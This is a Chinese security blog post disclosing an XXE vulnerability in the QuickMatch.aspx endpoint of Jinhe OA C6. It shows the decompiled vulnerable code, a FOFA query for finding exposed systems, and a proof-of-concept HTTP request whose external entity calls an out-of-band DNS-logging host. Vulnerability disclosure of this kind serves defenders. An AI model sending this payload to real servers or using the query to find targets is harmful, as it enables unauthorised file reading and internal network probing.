---
title: "金和OA QuickMatch.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html
asset_dir: assets/金和oa-quickmatch.aspx-xxe漏洞
---

# 金和OA QuickMatch.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/4 13:31
- 275浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

授权

软件

SQL

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `QuickMatch.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `QuickMatch.aspx` 在 `bin` 目录下查找 `JHSoft.Web.CrmCustomer.dll` 将其进行反编译后找到 **QuickMatch** 的处理逻辑

深入探索

漏洞扫描器

技术文章订阅

防火墙软件

```
public class QuickMatch : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时还存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

[![金和OA QuickMatch.aspx XXE漏洞](images/img-001-8dd52b0f9f58.webp)](https://image.mrxn.net/1bca808d1eaa44918700793e355b4b16.webp)

# 漏洞复现

深入探索

VPN服务

物流软件安全

代码安全审计

```
POST /c6/Jhsoft.Web.CrmCustomer/QuickMatch.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA QuickMatch.aspx XXE漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKYUlEQVR4AeycjXrzqA6E+373f897PNYOKICx069JfLb0iTpiNBIEGTvp/vz5+vr652/tn+bnar0m7XQ4qpuTRvGWG+m/w+Uc+e083x2rIVvuet1lB0pDti5/PWOjNwB8AQ+hWU1g10PFh+R/BxDxXOvf0APkuP0HwTaAqAVso++/gH3towqe+yrmGqUhmVz+53agawhE52GMV5aarwyIOjkPgsu6HG996zJvDqIWkMOdb31Gi4D9agfKXQIqZ92zCLUG9P6oXteQkWhx79uB1ZD37fWlmV7SEKjH06uAyvm24VhGqDoI33GIMWCq3GJUE9hvPSW4OeJl0Me28P5S3LYT2y+PM250eZkvxA85L2nID63tV5b5SEPg2tXqqxBC77EQgstdEy+DiEFF8TKoXM61DxH3WAg9J/4V9pqGvGKlv6TmasjNGt01RMd6Zs+uf1TLNSBuBYCpy+i6OQHYH+qOZYQ+lnPtO8fjv0HXOsJR7a4hI9Hi3rcDpSEQVxBcw9kS8xUBUW+kz7pRHCLXOogxUOTAfirgZ75lQ9QrExw4cKyDiME1zFOUhmRy+Z/bgdWQz+39cOY/vh38Dbqya3icEerxtQ4qZy1UrtV5LITQybe5hsdCc0aIPMDUZQS626OTNddP2Doh3tGbYNcQqFfBaI1Q43Duj64aiLxR/awfxa9wEPWBIs917TsIlCvfXEbrM0LNAbK81AIu+Tm5a0gO3sz/FcspDYHoZr4KvAMQMcDUw19ZTeZc+46N0Bqh40B3VY1iypFB1Vsn3mbOCFV/pJEWqg56XxrZrIZjGZXTGtT6pSGtaI0/swOrIZ/Z98NZLzUkHzn7UI+Zq0Pl4Ni3foSuL2zj4mwQ9bMGei7H5TtfCOd65YxM+bKrMejnUr4s17jUkJyw/NfuwB947BzEGCgzA92DVp09spKYnKxNdHEdhzqXg6OYuRE6Twi1Hjz6zpWuNccyZg1ELXMQY8DUw56ZzPWAXeOYcJ0Q7cKNbDXkRs3QUp5uiI8cxHEDVOfHzPWFbVFxNmA/7lCx1eex8zJC5GbOfs6175jQ3Ayla22mV+zphijpP2U3ezPdX3vz+qC/ghzPnYfQQWCOWX+GELlQcZbjObIGai6EP9I5ZxaDyIcxusYIIXJyDHoux+2vE+KduAmuhtykEV7G0w2BOHpQ0cWu3gKsh1rjai7UHKj/HF35rpsRQm8OYgyYevhwUMgTR/PJgD0/y8XLMmcfQg917Y4Jn26Ikpa9bgdKQyA6l6dSl2UQMaCExdtMAt3V4thVdM0R5hqOZ27kWwexNo+F0HOuofjMIHKtP8NRLYgaOVYaclZwxd+zA6sh79nny7OUPy762IwyHRM6DnHcYPxwsk45Mo+fQahzAKepmkc2EoqXjWLAfquFilkHwWfuWR+Oa0DEgK91Qr5e8vPtouWbuivoKrJB7RyE71jGNtdjIUSefJtzPRZC6KCi+GzOE5qHXq+4rdV5fIZQ67oWVG6WD6GbaY5i64Qc7cyH+PIM8fwQ3YX6bPAVIoQah/DbXI+FymlNvCzzGssy1/qKt5Y1bUxjiDVaBzEGFD4064WHoi2guGxzuxdQnk3SyKDncuI6IXk3buCvhtygCXkJ04e6hdAfMx0/m3UeQ9U7dhWh5kL4z+ZmvddkzuMzhJgbcOrwXw4E9ttSEW3OqDaELseg59YJ2TbwTq/pQ320UIiuQo/W56vA3Bk6J+vMwfFcWW8fej0EZ40Qek78kUHogSLxGguxOUB3aja6ezkXQg+sL4ZfN/tZt6y7NgTi2OT1QXA+WkLH5dvMQehhjtafIUQdz5MRIgYVc7z1Z3NBrQHh5/wruVnj3DMux+2vE+KduAle+tg7WivElQSUsK+MERbR5gD7Qw8qbnT3ch0IXRY4ljn7EHrAVPnIWojNmdXYwuUF7OstxOY4d4RbeH9B5AH7WL+AvRagYWfrhHRb8lliNeSz+9/NPv0e4uMIdMfMsYyuDlUP4TuWMedC6DKXtc/4oxoQ9XMd6Lkct+96HgshciFQ3MwgdK4lhJ5bJ2S2ix+IlYe6OibLa4DoYObsQ8SgomNnqHlkUHM1lkHlIHzxMogxVDybC0KrfBnEGOo/Xjir4bjybS0HtS6Eb63Q+oziZRB6YH1T/7rZT3mGQHRptD51cWajnJbL+dDPBT03q5Hr2YeoARXbWK4Jocuc9ZmD0EHFkS7nXPEh6mXtB54hefrltzuwGtLuyIfHpSE+giOEOFpAWS5QPgo7B4IrouRAxGD8MHWNEaYyxYVaD8J3bhElx7GMKVxciFqFOHEg9Lmu/VEqhB7G+1AaMkpe3Pt3oGsI1A5C+KNl+SoQwqNOXGtnNRyHqAWYKiexEJvT1tcY2LXybRDclvKjL4i6nudqceuF8FhDXNeQq4WX7jU7sBrymn39dtXyTR364+OqOko2cxB6wNQQgf02koNwzHkeYc5pfehrKEcGEQNKGtCtQ9rWSkJyWo3GKby7EPWBfdz+Uo4s8xrLMrdOSN6NG/ilIeqUDNivJBh/LPOapbWZM0Jfw1rhSDfiIOo4doYQes1hc047Fg+hl98aRAwoIaDsjUkIzmMhHHMQMaioHFtpiIn/V/yvrHs15Gad7P646KMthHqsIHyvH2IM81ub9SPUHDNrc6DO6RhUzrUceyd6buFoXvFHBvU9rBMy2r0PcuVjr7sHtVvmMkLEMzdbP4Q+a5ybOfsQepifvFkN17qKUOd0jusLIeLyba0OQgN13VA5CN95QgjONYXrhGhnbmSrITdqhpYyfahLIIM4WjA/jjpyrSn/yKDWPdJkPtc2P+IcEzou/8isyZi15qFfLwSX9dBzOW7fdT0WrhOiXbiRdQ/10drcSaHj8luDuDKgovVQOQjfMSEEl2uKl5mD0EBFxW0QvMcjhNDA/LTnXIiczNn32kZojdBxiFqA6N2A8heAdUL2LTn69X6+e4ZA7RZc868s21eIcKaHOudM5xhUvWrLoHKtzuMzhL6GatvafOj1rebKeJ2QK7v0Rs1qyBs3+8pUpSE+ildxVnxUI+tHcXNZZx/idmBNRmsy5jhEbo63ftaPfOshagGmCua8QiYH2B/cZ7rSkJS73A/uQNcQiE7CGGdrdfdHGhjXg0feNYQQMdeDGAOmhgjsVyMwjJsEdp3HQggOKoo/Mqg6ePSPclpe79XWNaQVr/F7d2A15L37fTrbyxsCcYzzSnw8M+b4FR+ibq4BwY3ys86+dRB5gKlTdI0RzpKB/TYJY3x5Q2aL+62x2fv+0YZA3/XR5BC6UWzGnV2Njuca5qCf07GRPnMjH6IeBGbNqG6Oz/wfbchsohW7tgOrIdf26W2qriE+bkc4W9kox/ocMwdx3AFTDw+8nCMfKHEnQOUgfMeEEJzyZRBjqCidDYKXdmbWWwORBzhU/u8R0piUP7OuIU5c+JkdKA0BytUH5/5suVDzZ7p8pViXOah1AEsO0blZYA7Y31+O2bdGaG6EEDWAEgb2usq1OQgRA0wNEdhrAOs/i/662U85ITdb169dzv8AAAD//0gg5I4AAAAGSURBVAMArbtbqq8kdS4AAAAASUVORK5CYII=)

手机扫码阅读
